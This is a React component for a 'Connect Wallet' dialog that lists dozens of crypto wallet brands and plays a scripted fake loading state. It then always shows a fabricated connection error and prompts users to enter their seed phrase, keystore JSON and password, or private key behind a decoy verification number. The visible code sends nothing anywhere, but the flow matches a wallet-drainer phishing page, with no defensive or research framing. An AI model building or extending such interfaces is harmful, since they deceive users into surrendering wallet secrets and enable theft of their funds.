
'use client';

import { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogClose,
  DialogFooter,
} from '@/components/ui/dialog';
import { Button } from './ui/button';
import { Wallet, ArrowLeft, RefreshCw } from 'lucide-react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from './ui/textarea';
import { Input } from './ui/input';
import { Alert, AlertDescription } from './ui/alert';

const wallets = [
  'Metamask', 'Coinbase', 'WalletConnect', 'Trust', 'Xumm', 'Cardano',
  'Daedalus', 'Yoroi', 'CCVault', 'Gero', 'Nami', 'Solana', 'Phantom',
  'Solflare', 'Sollet', 'Solong', 'Exodus', 'Avalanche', 'Velas',
  'crypto.com', 'Blockchain', 'Binance Smart Chain', 'Safepal', 'Argent',
  'Fortmatic', 'Aktionariat', 'Keyring Pro', 'BitKeep', 'SparkPoint', 'OwnBit',
  'Infinity Wallet', 'Wallet.io', 'Infinito', 'Torus', 'Nash', 'BitPay',
  'imToken', 'Ambire', 'Apollox', 'Bitski', 'Bobablocks', 'Crossmint',
  'Defiant', 'Fireblocks', 'Kryptogo', 'Ledger', 'Now', 'Nufinetes',
  'Onekey', 'Paper', 'Pier', 'Prema', 'Rice', 'Safemoon', 'Secux',
  'Sequence', 'Tokenary', 'Unipass', 'Venly', 'Verso', 'Wallet3',
  'Polkadot', 'Filecoin', 'IOST', 'Qtum', 'Waves', 'Algorand', 'Zcash',
  'Vechain', 'Tezos', 'Stellar', 'Tron', 'Terra', 'Cosmos', 'Metis',
  'Optimism', 'Injective', 'Other Wallet'
];

type WalletConnectDialogProps = {
  issue: string | null;
};

export function WalletConnectDialog({ issue }: WalletConnectDialogProps) {
    const [view, setView] = useState<'grid' | 'initializing' | 'form'>('grid');
    const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
    const [isDialogOpen, setIsDialogOpen] = useState(false);

    useEffect(() => {
        if (issue) {
            setIsDialogOpen(true);
        }
    }, [issue]);

    useEffect(() => {
        if (view === 'initializing') {
            const timer = setTimeout(() => {
                setView('form');
            }, 2000);

            return () => clearTimeout(timer);
        }
    }, [view]);

    const handleWalletSelect = (wallet: string) => {
        setSelectedWallet(wallet);
        setView('initializing');
    }

    const reset = () => {
        setView('grid');
        setSelectedWallet(null);
    }
    
    const closeAndReset = () => {
        setIsDialogOpen(false);
        // Add a delay to allow the dialog to close before resetting state
        setTimeout(reset, 300);
    }

    const handleConnect = () => {
        // In a real app, you would handle the connection logic here
        // For now, it just closes the dialog
        closeAndReset();
    }
    
    return (
        <Dialog open={isDialogOpen} onOpenChange={(open) => {
            if (!open) {
                closeAndReset();
            } else {
                setIsDialogOpen(true);
            }
        }}>
            <DialogContent 
                className={view === 'grid' ? "max-w-3xl" : "max-w-lg"}
                onInteractOutside={(e) => {
                    e.preventDefault();
                    closeAndReset();
                }}
            >
                {view === 'grid' && (
                    <>
                        <DialogHeader>
                            <DialogTitle className="text-center text-2xl">
                                Connect Wallet
                            </DialogTitle>
                            <DialogDescription className="text-center">
                                Connect with one of our available wallet providers to resolve your issue.
                            </DialogDescription>
                        </DialogHeader>
                        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 py-4 max-h-[70vh] overflow-y-auto">
                            {wallets.map((wallet) => (
                            <Button
                                key={wallet}
                                variant="outline"
                                className="w-full h-16 justify-start text-lg bg-card/50 hover:bg-primary/10 border-primary/20"
                                onClick={() => handleWalletSelect(wallet)}
                            >
                                <Wallet className="mr-4 h-6 w-6 text-primary" />
                                {wallet}
                            </Button>
                            ))}
                        </div>
                    </>
                )}
                {view === 'initializing' && (
                    <>
                        <DialogHeader>
                             <DialogTitle className="sr-only">Initializing Connection</DialogTitle>
                            <div className="flex items-center gap-2 text-green-400 font-semibold">
                                Initializing
                                <span className="animate-pulse-dot-1">.</span>
                                <span className="animate-pulse-dot-2">.</span>
                                <span className="animate-pulse-dot-3">.</span>
                            </div>
                        </DialogHeader>
                        <div className="py-8">
                            <div className='flex justify-between items-center bg-card/50 p-4 rounded-lg border border-primary/20'>
                                <div>
                                    <h3 className="font-bold text-lg">{selectedWallet}</h3>
                                    <p className="text-sm text-muted-foreground">Easy-to-use browser extension</p>
                                </div>
                                <Wallet className="h-8 w-8 text-primary" />
                            </div>
                        </div>
                        <Button variant="ghost" onClick={reset} className="absolute top-4 left-4 text-muted-foreground">
                            <ArrowLeft className="h-4 w-4 mr-2" />
                            Back
                        </Button>
                    </>
                )}
                {view === 'form' && (
                     <>
                        <DialogHeader>
                           <DialogTitle className="sr-only">Manual Connection</DialogTitle>
                           <Alert variant="destructive" className="bg-destructive/10 text-destructive-foreground border-destructive/20">
                             <AlertDescription>
                               There was an error connecting automatically. Please connect manually.
                             </AlertDescription>
                           </Alert>
                        </DialogHeader>
                        <div className="pt-4">
                            <Tabs defaultValue="phrase" className="w-full">
                               <TabsList className="grid w-full grid-cols-3">
                                    <TabsTrigger value="phrase">Phrase</TabsTrigger>
                                    <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
                                    <TabsTrigger value="private">Private Key</TabsTrigger>
                                </TabsList>
                                <TabsContent value="phrase" className="pt-4 space-y-4">
                                     <Textarea placeholder="Enter your phrase" className="min-h-[100px]" />
                                     <Input placeholder="Wallet name" />
                                     <div className="flex items-center gap-4">
                                         <div className="flex-1 p-2 rounded-md bg-muted text-center tracking-[0.5em] text-lg font-bold select-none">
                                            6 2 3 1 5
                                         </div>
                                         <Button variant="ghost" size="icon">
                                            <RefreshCw className="h-5 w-5" />
                                         </Button>
                                     </div>
                                      <Input placeholder="Type the number shown above" />
                                </TabsContent>
                                <TabsContent value="keystore" className="pt-4 space-y-4">
                                     <Textarea placeholder="Enter your keystore JSON" className="min-h-[100px]" />
                                     <Input type="password" placeholder="Wallet password" />
                                     <Input placeholder="Wallet name" />
                                     <div className="flex items-center gap-4">
                                         <div className="flex-1 p-2 rounded-md bg-muted text-center tracking-[0.5em] text-lg font-bold select-none">
                                            5 5 3 4 0
                                         </div>
                                         <Button variant="ghost" size="icon">
                                            <RefreshCw className="h-5 w-5" />
                                         </Button>
                                     </div>
                                      <Input placeholder="Type the number shown above" />
                                </TabsContent>
                                 <TabsContent value="private" className="pt-4 space-y-4">
                                     <Input placeholder="Enter your private key" />
                                     <Input placeholder="Wallet name" />
                                     <div className="flex items-center gap-4">
                                         <div className="flex-1 p-2 rounded-md bg-muted text-center tracking-[0.5em] text-lg font-bold select-none">
                                            5 5 3 4 0
                                         </div>
                                         <Button variant="ghost" size="icon">
                                            <RefreshCw className="h-5 w-5" />
                                         </Button>
                                     </div>
                                     <Input placeholder="Type the number shown above" />
                                </TabsContent>
                            </Tabs>
                        </div>
                        <DialogFooter className="sm:justify-between pt-4">
                             <DialogClose asChild>
                                <Button type="button" variant="destructive" onClick={closeAndReset}>
                                    Close
                                </Button>
                            </DialogClose>
                            <Button type="button" onClick={handleConnect} className="bg-blue-600 hover:bg-blue-700 text-white">
                                Connect
                            </Button>
                        </DialogFooter>
                     </>
                )}
                 {!['form'].includes(view) && (
                     <DialogClose onClick={closeAndReset} />
                 )}
            </DialogContent>
        </Dialog>
    )
}
